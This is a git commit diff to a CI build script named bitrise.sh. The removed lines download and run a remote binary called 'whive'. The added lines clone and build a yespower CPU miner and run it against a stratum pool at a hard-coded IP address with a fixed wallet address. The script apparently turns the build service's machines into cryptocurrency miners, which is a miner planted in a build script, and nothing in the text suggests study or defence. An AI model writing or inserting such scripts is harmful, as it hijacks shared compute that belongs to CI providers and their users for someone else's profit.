8df30dc4bde06e71505e05f8709029fd4e7a0132
oremine01 <oremine01@outlook.com>
2024-06-24 07:15:40 +0530

    Update bitrise.sh

--- bitrise.sh
+++ bitrise.sh
@@ -1,3 +1,6 @@
-wget https://github.com/oremine01/ore/raw/main/whive
-chmod +x whive
-./whive -q -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -o stratum+tcp://206.189.2.17:3333 -a yespower
+cd
+git clone https://github.com/whiveio/whive-cpuminer-mc-yespower.git 
+cd whive-cpuminer-mc-yespower
+sudo apt-get install build-essential libcurl4-openssl-dev -y
+./build.sh
+./minerd -q -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -o stratum+tcp://206.189.2.17:3333 -a yespower
